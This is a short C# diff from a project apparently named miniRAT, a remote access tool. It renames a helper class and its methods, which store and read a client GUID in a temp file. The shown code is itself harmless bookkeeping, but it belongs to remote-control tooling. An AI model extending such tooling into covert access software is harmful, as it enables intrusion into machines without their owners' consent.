@@ -7,11 +7,11 @@ using System.Threading.Tasks;
 
 namespace miniRAT
 {
-    public class TempFile
+    public class ClientKeyRegistery
     {
         static readonly string fileName = Path.Combine(Path.GetTempPath(), "miniRat_Client.tmp");
 
-        public static string GetOrCreateTmpFile()
+        private static string GetOrCreateTmpFile()
         {
             try
             {
@@ -29,7 +29,7 @@ namespace miniRAT
 
             return fileName;
         }
-        public static void UpdateTmpFileGuid(string txt)
+        public static void UpdateGuid(string txt)
         {
             try
             {
@@ -41,7 +41,7 @@ namespace miniRAT
                 Console.WriteLine("Error writing to TEMP file: " + ex.Message);
             }
         }
-        public static Guid ReadTmpFileGuid()
+        public static Guid ReadGuid()
         {
             string fileContent = string.Empty;
             GetOrCreateTmpFile();
